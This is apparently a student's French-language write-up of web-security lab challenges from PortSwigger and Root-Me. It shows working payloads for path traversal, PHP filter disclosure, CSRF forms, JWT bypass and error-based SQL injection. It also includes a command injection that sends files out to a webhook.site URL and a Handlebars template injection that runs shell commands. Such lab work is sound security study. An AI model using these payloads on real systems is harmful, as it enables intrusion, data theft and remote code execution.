## Sommaire
- [1. File path traversal - Null byte bypass](#1-file-path-traversal---null-byte-bypass)
- [2. PHP - Filters](#2-php---filters)
- [3. CSRF - Contournement de jeton](#3-csrf---contournement-de-jeton)
- [4. CSRF where token is not tied to user session](#4-csrf-where-token-is-not-tied-to-user-session)
- [5. CSRF where Referer validation depends on header being present](#5-csrf-where-referer-validation-depends-on-header-being-present)
- [6. JWT - Jeton révoqué](#6-jwt---jeton-révoqué)
- [7. SQL injection - Error](#7-sql-injection---error)
- [8. Injection de commande - Contournement de filtre](#8-injection-de-commande---contournement-de-filtre)
- [10. Server-side template injection](#10-server-side-template-injection)

# 1. File path traversal - Null byte bypass
Link: https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

Depuis HTTP history dans Burp Suite, j'ai repéré la requête de récupération d'une image et je l'ai envoyée dans Repeater. En modifiant le paramètre `filename` avec un chemin relatif et un byte nul, le serveur accepte encore l'extension `.png` mais lit le fichier pointé avant le `%00`. Cela m'a permis de récupérer `/etc/passwd` malgré la validation côté serveur.

```http
GET /image?filename=../../../etc/passwd%00.png HTTP/2
Host: 0a97006403436ad3840fa4d000a90033.web-security-academy.net
Cookie: session=NVJdQdCDE5vtDqRbXMSoZaJJjtvvEGxA
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
...
```

<img src="img/File path traversal - Null byte bypass.png" alt="capture 1" width="400">

# 2. PHP - Filters
Link: https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters

Pour réaliser ce projet, j'ai dans un premier temps fait une recherche sur les PHP filters et leur fonctionnement.
J'ai ensuite commencé à tester différents filtres dans mon URL.

Cette URL m'a permis d'afficher le contenu du fichier `config.php` encodé en base64 :

http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php

<img src="img/PHP - Filters 1.png" alt="capture 3" width="400">

J'ai ensuite décodé le contenu en utilisant un décodeur en ligne.

Ce qui m'a permis d'obtenir les informations suivantes :

<img src="img/PHP - Filters 2.png" alt="capture 4" width="400">

Je me suis ensuite connecté à la page d'administration avec les identifiants trouvés, ce qui m'a affiché le message de validation du challenge.

Pour valider le projet, il me suffisait simplement d'entrer le mot de passe de l'administrateur.

<img src="img/PHP - Filters 3.png" alt="capture 5" width="400">

# 3. CSRF - Contournement de jeton
Link: https://www.root-me.org/fr/Challenges/Web-Client/CSRF-Contournement-de-jeton

Pour contourner la protection, on utilise un script qui récupère la page de profil, extrait automatiquement le token CSRF puis le réinjecte dans un formulaire préparé avec mon pseudo et la case à cocher activée. Dès que la victime charge la page piégée, le formulaire est soumis avec un jeton valide obtenu.

```html
<form action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" name="csrf_form" enctype="multipart/form-data">
	<input id="username" type="text" name="username" value="moi">
	<input id="status" type="checkbox" name="status" checked>
	<input id="token" type="hidden" name="token" value="">
	<button type="submit">Submit</button>
</form>
<script>
	const xhttp = new XMLHttpRequest();
	xhttp.open('GET', 'http://challenge01.root-me.org/web-client/ch23/?action=profile', false);
	xhttp.send();
	const token = xhttp.responseText.match(/[a-f0-9]{32}/)?.[0] ?? '';
	document.getElementById('token').value = token;
	document.csrf_form.submit();
</script>
```

<img src="img/CSRF - Jeton contournement.png" alt="capture 2" width="400">

# 4. CSRF where token is not tied to user session
Link: https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session

Le token CSRF n'étant pas lié à la session, j'ai intercepté une requête de changement d'e-mail avec un premier compte via burp, récupéré la valeur du champ `csrf`, puis drop la requête. Après m'être connecté avec un autre compte, j'ai répété l'action et remplacé la valeur du token par celle enregistrée : le serveur a accepté la modification car il ne valide pas l'association token/session. J'ai encapsulé cette attaque dans un formulaire piégé.

```html
<form action="https://0a49009d0379721b8051d56d00ad00ef.web-security-academy.net/my-account/change-email" method="post">
	<input type="hidden" name="email" value="modifmail@gmail.com">
	<input type="hidden" name="csrf" value="gSsyPMk9wJTVy08hkRYStDibQDlZ2Krm">
</form>
<script>
	document.forms[0].submit();
</script>
```

<img src="img/CSRF - Token not tied session.png" alt="capture 3" width="400">

# 5. CSRF where Referer validation depends on header being present
Link: https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present

Le serveur n'applique la vérification du Referer que si l'en-tête est présent. Après avoir capturé une requête `POST /my-account/change-email`, j'ai testé dans Repeater : un Referer modifié déclenche un refus, mais la suppression totale de l'en-tête laisse passer la requête et met à jour l'adresse e-mail. Cette faiblesse permet de préparer un formulaire malveillant.

```http
POST /my-account/change-email HTTP/2
Host: 0a5a005503046d8e80600888005b000c.web-security-academy.net
Cookie: session=qcfIlCBU3kMUP9jSVSk3NCTL0vhNZDO0
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: https://0a5a005503046d8e80600888005b000c.web-security-academy.net

email=testt%40gmail.com
```

<img src="img/CSRF - Referer optional.png" alt="capture 4" width="400">

# 6. JWT - Jeton révoqué
Link: https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque

Recuper le token jwt grace a cette commande : 

curl -i -X POST http://challenge01.root-me.org/web-serveur/ch63/login     
 -H "Content-Type: application/json"
 -d '{"username":"admin","password":"admin"}'

<img src="img/JWT - Jeton révoqué 1.png" alt="capture 6" width="400">

Pour pouvoir recupere le mp secret a fin de valider le challenge, il faut modifier le token en rajoutant == a la fin.
En rajoutant == a la fin du token, cela permet de changer le token au niveau de server sans modifier la charge utile.
Ce qui permet de contourner la verification du token.

curl -X GET http://challenge01.root-me.org/web-serveur/ch63/admin      
-H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjQ2OTAwMjcsIm5iZiI6MTc2NDY5MDAyNywianRpIjoiZjlmMzQ5NWQtNTE1MS00MGU0LThhMGUtOGU3MDUyZGU1MjhmIiwiZXhwIjoxNzY0NjkwMjA3LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.uDYdxBNpUqAbFEQp05ksB6LVHA_51DYsXQsjSfm__Gc=="

<img src="img/JWT - Jeton révoqué 2.png" alt="capture 7" width="400">

Pojet validé.

<img src="img/JWT - Jeton révoqué 3.png" alt="capture 8" width="400">

# 7. SQL injection - Error
Link: https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Error

Pour réaliser ce projet, j'ai dans un premier temps testé une injection SQL classique dans le champ de recherche.
or 1= 1 etc.
Mais cela n'a pas fonctionné.
Je me suis donc renseigné sur les injections SQL de type Error Based.
J'ai découvert qu'il était possible de provoquer des erreurs SQL dans l'url.

J'ai donc testé en commençant par cette URL :
http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,%20(CAST(version()%20AS%20integer))

<img src="img/SQL injection - Error 1.png" alt="capture 9" width="400">
Cela m'a permis de récupérer la version du SGBD.

Jai ensuite fait cette URL pour récupérer le nom des tables :
http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,%20(CAST((SELECT%20table_name%20FROM%20information_schema.tables%20LIMIT%201%20OFFSET%200)%20AS%20integer))

<img src="img/SQL injection - Error 2.png" alt="capture 10" width="400">

J'ai ensuite récupéré le nom des colonnes de la table m3mbr35t4bl3 en utilisant cette URL :

http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,%20(CAST((SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name=$$m3mbr35t4bl3$$%20LIMIT%201%20OFFSET%200)%20AS%20integer))

<img src="img/SQL injection - Error 3.png" alt="capture 11" width="400">

J'ai ensuite récupéré les usernames avec cette URL : 
http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,%20(CAST((SELECT%20[us3rn4m3_c0l]%20FROM%20[m3mbr35t4bl3]%20LIMIT%201%20OFFSET%200)%20AS%20integer))

<img src="img/SQL injection - Error 4.png" alt="capture 12" width="400">

Enfin, j'ai récupéré le mot de passe de l'utilisateur admin avec cette URL :

http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,%20(CAST((SELECT%20p455w0rd_c0l%20FROM%20m3mbr35t4bl3%20WHERE%20us3rn4m3_c0l=$$admin$$%20LIMIT%201%20OFFSET%200)%20AS%20integer))

<img src="img/SQL injection - Error 5.png" alt="capture 13" width="400">

<img src="img/SQL injection - Error 6.png" alt="capture 14" width="400">

# 8. Injection de commande - Contournement de filtre
link: https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre

Pour réaliser ce projet, ont a essayé de curl l'index.php pour récupérer son contenu avec la commande suivante :

curl -X POST "http://challenge01.root-me.org/web-serveur/ch53/index.php" -d "ip=127.0.0.1%0acurl+--data+'@index.php'+https://https://webhook.site/763b03a2-df25-49a9-bab6-28d541205452"

Dans cette commande, on utilise l'injection de commande pour exécuter une deuxième commande curl qui envoie le contenu de index.php vers webhook.site.

<img src="img/Injection de commande - Contournement de filtre 1.png" alt="capture 15" width="400">

On peut voir que le contenu de index.php a bien été envoyé vers webhook.site.

<img src="img/Injection de commande - Contournement de filtre 2.png" alt="capture 16" width="400">

Nous pouvons voir que dans le contenu il y a un élément qui ce nome .passwd.

Nous avons donc relancé une commande curl pour récupérer le contenu du .passwd.

Commande utilisée :
curl -X POST "http://challenge01.root-me.org/web-serveur/ch53/index.php" -d "ip=127.0.0.1%0acurl+--data+'@.passwd'+https://https://webhook.site/763b03a2-df25-49a9-bab6-28d541205452"

<img src="img/Injection de commande - Contournement de filtre 3.png" alt="capture 17" width="400">

Nous pouvons voir que le mot de passe est bien récupéré.

<img src="img/Injection de commande - Contournement de filtre 4.png" alt="capture 18" width="400">

# 9. API - Mass Assignment
Link: https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment?lang=fr

Pour réaliser ce projet, j'ai commencé par analyser la documentation Swagger de l'API pour identifier les endpoints disponibles.

Les endpoints identifiés sont :
- POST /api/signup - Création d'utilisateur (accepte: username, password)
- POST /api/login - Connexion (accepte: username, password)
- GET /api/user - Récupération des informations utilisateur (retourne: id, username, note, status)
- PUT /api/note - Mise à jour de la note (accepte: note)
- GET /api/flag - Récupération du flag (nécessite le statut admin)

J'ai d'abord testé plusieurs tentatives d'injection de paramètres supplémentaires lors de l'inscription et de la modification de la note, mais ces endpoints filtraient correctement les champs non autorisés.

Après avoir testé différentes méthodes HTTP sur l'endpoint /api/user, j'ai découvert qu'une méthode PUT non documentée était disponible.

J'ai créé un compte utilisateur standard et me suis connecté pour obtenir une session.

Ensuite, j'ai envoyé une requête PUT vers /api/user avec le corps suivant :
{"status":"admin"}

Cette requête a été acceptée et mon statut utilisateur a été modifié en admin.

J'ai ensuite pu accéder à l'endpoint /api/flag pour récupérer le flag de validation.

Le flag obtenu confirme la vulnérabilité : la documentation Swagger ne montrait que la méthode GET pour /api/user, mais la méthode PUT était disponible et vulnérable à l'injection de masse sans validation appropriée des champs status.
# 10. Server-side template injection
Link: https://portswigger.net/web-security/server-side-template-injection

Après avoir déclenché une erreur sur la page produit en cliquant sur plus de details sur l'un des produits., j'ai testé une chaine de characteres d'exploit ssti  https://github.com/payloadbox/ssti-payloads `{{5*5}}` dans le paramètre `message` et dans la reponse on voit que l'app contient l'utilisation de Handlebars côté serveur via node. En important le payload d'exploit Handlebars https://gist.github.com/vandaimer/b92cdda62cf731c0ca0b05a5acf719b2 qui permet via faille de Handlbars d'executer des commandes shell sur le serveur je l'ai modifié pour executer ls -la pour verifier la presence de morale.txt puis j'ai modifié la commande pour supprimer le fichier avec rm morale.txt et verifier la reussite en faisant une autre fois un ls -la.

```handlebars
{{#with "s" as |string|}}
	{{#with "e"}}
		{{#with split as |conslist|}}
			{{this.pop}}
			{{this.push (lookup string.sub "constructor")}}
			{{this.pop}}
			{{#with string.split as |codelist|}}
				{{this.pop}}
				{{this.push "return require('child_process').execSync('rm morale.txt');"}}
				{{this.pop}}
				{{#each conslist}}
					{{#with (string.sub.apply 0 codelist)}}
						{{this}}
					{{/with}}
				{{/each}}
			{{/with}}
		{{/with}}
	{{/with}}
{{/with}}
```

<img src="img/SSTI - Unknown template exploit.png" alt="capture 19" width="400">
